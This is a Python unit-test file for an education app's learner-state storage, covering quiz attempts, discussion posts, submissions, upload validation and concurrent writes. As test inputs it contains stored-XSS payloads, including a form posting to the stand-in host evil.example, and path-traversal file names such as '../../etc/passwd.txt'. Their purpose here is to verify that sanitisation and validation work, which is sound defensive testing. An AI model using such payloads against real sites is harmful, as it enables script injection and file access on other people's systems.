"""Unit tests for the shared learner-state persistence layer (W10 §10).

Covers the persistence core directly (no app/router): attempt + post +
submission roundtrip, X-Learner-Id ownership isolation, stored-XSS rejection,
file-upload validation (oversized / disallowed-ext / traversal), and a
concurrency-safe append (two parallel appends never corrupt the JSONL).

All state lands under the ``state_dir`` temp redirect (``ED4ALL_STATE_RUNS_DIR``)
so nothing touches the real ``state/``. No hardcoded production slug — a local
test slug is used against the temp store only.
"""

from __future__ import annotations

import json
import threading
from pathlib import Path

import pytest

pytest.importorskip("bs4")  # _sanitize_text needs BeautifulSoup

from gui.services import learner_state  # noqa: E402

_SLUG = "test-learn-course"


# ------------------------------------------------------------- attempts (1)


def test_attempt_roundtrip(state_dir: Path):
    grade = {"score": 2, "max_score": 3, "per_item": [{"question_id": "q1", "correct": True}]}
    rec = learner_state.record_attempt(_SLUG, "quiz_01", "learner-A", {"q1": "B"}, grade)
    assert rec["ts"]  # server-injected
    assert rec["score"] == 2 and rec["max_score"] == 3

    got = learner_state.read_attempts(_SLUG, "quiz_01", "learner-A")
    assert len(got) == 1
    assert got[0]["answers"] == {"q1": "B"}
    assert got[0]["score"] == 2


def test_attempt_owner_isolation(state_dir: Path):
    learner_state.record_attempt(_SLUG, "quiz_01", "learner-A", {"q1": "A"}, {"score": 1, "max_score": 1})
    learner_state.record_attempt(_SLUG, "quiz_01", "learner-B", {"q1": "B"}, {"score": 0, "max_score": 1})

    a = learner_state.read_attempts(_SLUG, "quiz_01", "learner-A")
    b = learner_state.read_attempts(_SLUG, "quiz_01", "learner-B")
    assert len(a) == 1 and len(b) == 1
    assert a[0]["learner_id"] == "learner-A"
    # Learner A never sees learner B's attempt.
    assert all(r["learner_id"] == "learner-A" for r in a)
    assert b[0]["score"] == 0


def test_attempt_filtered_by_assessment(state_dir: Path):
    learner_state.record_attempt(_SLUG, "quiz_01", "learner-A", {}, {"score": 1, "max_score": 1})
    learner_state.record_attempt(_SLUG, "quiz_02", "learner-A", {}, {"score": 0, "max_score": 1})
    assert len(learner_state.read_attempts(_SLUG, "quiz_01", "learner-A")) == 1
    assert len(learner_state.read_attempts(_SLUG, "quiz_02", "learner-A")) == 1


# ------------------------------------------------------------ discussion (2)


def test_discussion_roundtrip_and_thread(state_dir: Path):
    root = learner_state.add_post(_SLUG, "topic-1", "learner-A", "Top-level point.")
    learner_state.add_post(
        _SLUG, "topic-1", "learner-B", "A reply.", parent_post_id=root["post_id"]
    )
    posts = learner_state.read_posts(_SLUG, "topic-1")
    assert len(posts) == 2
    # World-readable within the course: both learners' posts are visible.
    assert {p["learner_id"] for p in posts} == {"learner-A", "learner-B"}
    reply = next(p for p in posts if p["learner_id"] == "learner-B")
    assert reply["parent_post_id"] == root["post_id"]


def test_discussion_replies_flatten_to_one_level(state_dir: Path):
    root = learner_state.add_post(_SLUG, "t", "A", "root")
    reply = learner_state.add_post(_SLUG, "t", "B", "reply", parent_post_id=root["post_id"])
    # A reply-to-a-reply re-parents up to the root (one level only).
    nested = learner_state.add_post(_SLUG, "t", "C", "nested", parent_post_id=reply["post_id"])
    assert nested["parent_post_id"] == root["post_id"]


def test_discussion_strips_stored_xss(state_dir: Path):
    hostile = (
        "Hello <script>alert(1)</script> "
        '<form action="https://evil.example/collect"><input name="x"></form>'
        '<img src=x onerror="alert(2)">'
    )
    rec = learner_state.add_post(_SLUG, "t", "A", hostile)
    body = rec["body_sanitized"]
    assert "<script" not in body.lower()
    assert "alert(1)" not in body  # script CONTENT decomposed
    assert "onerror" not in body.lower()
    assert "https://evil.example" not in body  # action stripped wholesale
    assert "Hello" in body  # benign text survives


# ----------------------------------------------------------- submission (3)


def test_submission_text_roundtrip(state_dir: Path):
    rec = learner_state.save_submission(_SLUG, "asn_01", "learner-A", "My answer is 42.")
    assert rec["text_sanitized"] == "My answer is 42."
    assert rec["file"] is None
    got = learner_state.read_submission(_SLUG, "asn_01", "learner-A")
    assert got is not None and got["text_sanitized"] == "My answer is 42."


def test_submission_owner_isolation(state_dir: Path):
    learner_state.save_submission(_SLUG, "asn_01", "learner-A", "A's work")
    learner_state.save_submission(_SLUG, "asn_01", "learner-B", "B's work")
    a = learner_state.read_submission(_SLUG, "asn_01", "learner-A")
    b = learner_state.read_submission(_SLUG, "asn_01", "learner-B")
    assert a["text_sanitized"] == "A's work"
    assert b["text_sanitized"] == "B's work"
    # Learner A cannot read B's submission under A's id (separate path).
    assert a["learner_id"] == "learner-A"


def test_submission_strips_stored_xss(state_dir: Path):
    rec = learner_state.save_submission(
        _SLUG, "asn_01", "learner-A", "Answer <script>steal()</script> here"
    )
    assert "<script" not in rec["text_sanitized"].lower()
    assert "steal()" not in rec["text_sanitized"]


def test_submission_with_valid_file(state_dir: Path):
    rec = learner_state.save_submission(
        _SLUG, "asn_01", "learner-A", "see attached",
        file_bytes=b"%PDF-1.4 fake pdf bytes", original_filename="homework.pdf",
    )
    assert rec["file"]["stored_name"] == "upload.pdf"
    assert rec["file"]["original_filename"] == "homework.pdf"
    blob = learner_state.read_submission_blob(_SLUG, "asn_01", "learner-A")
    assert blob is not None
    data, meta = blob
    assert data == b"%PDF-1.4 fake pdf bytes"
    assert meta["stored_name"] == "upload.pdf"


# ---------------------------------------------------- file-upload validation


def test_upload_rejects_disallowed_extension(state_dir: Path):
    with pytest.raises(learner_state.LearnerStateError) as ei:
        learner_state.validate_upload("malware.exe", 100)
    assert ei.value.status == 415


def test_upload_rejects_oversized(state_dir: Path):
    with pytest.raises(learner_state.LearnerStateError) as ei:
        learner_state.validate_upload("big.pdf", learner_state.MAX_UPLOAD_BYTES + 1)
    assert ei.value.status == 413


def test_upload_rejects_traversal_filename(state_dir: Path):
    # A traversal/path-bearing name is reduced to its basename; the resulting
    # stored name is always the safe ``upload<ext>`` (never escapes the dir).
    assert learner_state.validate_upload("../../etc/passwd.txt", 10) == "upload.txt"
    assert learner_state.validate_upload("/abs/path/x.md", 10) == "upload.md"
    # A bare ``..`` / hidden-dotfile name is rejected outright.
    with pytest.raises(learner_state.LearnerStateError):
        learner_state.validate_upload("..", 10)
    with pytest.raises(learner_state.LearnerStateError):
        learner_state.validate_upload(".hidden", 10)


def test_submission_oversized_bytes_rejected(state_dir: Path):
    big = b"x" * (learner_state.MAX_UPLOAD_BYTES + 10)
    with pytest.raises(learner_state.LearnerStateError) as ei:
        learner_state.save_submission(
            _SLUG, "asn_01", "learner-A", "text", file_bytes=big, original_filename="big.pdf"
        )
    assert ei.value.status == 413


def test_traversal_slug_rejected(state_dir: Path):
    with pytest.raises(learner_state.LearnerStateError):
        learner_state.record_attempt("../escape", "q", "A", {}, {"score": 0, "max_score": 0})
    with pytest.raises(learner_state.LearnerStateError):
        learner_state.add_post(_SLUG, "../topic", "A", "x")


# ---------------------------------------------------- concurrency-safe append


def test_concurrent_appends_do_not_corrupt_jsonl(state_dir: Path):
    """Many parallel appends to one attempts file all land as complete lines."""
    n = 40

    def worker(i: int) -> None:
        learner_state.record_attempt(
            _SLUG, "quiz_concurrent", f"learner-{i}", {"q": str(i)}, {"score": i, "max_score": n}
        )

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # Read the raw file: every line must be valid JSON and the count must match.
    from gui import shared_state  # noqa: PLC0415

    path = shared_state.gui_state_dir() / "learn" / _SLUG / "attempts.jsonl"
    lines = [ln for ln in path.read_text(encoding="utf-8").splitlines() if ln.strip()]
    assert len(lines) == n
    parsed = [json.loads(ln) for ln in lines]  # raises if any line is half-written
    assert {p["learner_id"] for p in parsed} == {f"learner-{i}" for i in range(n)}
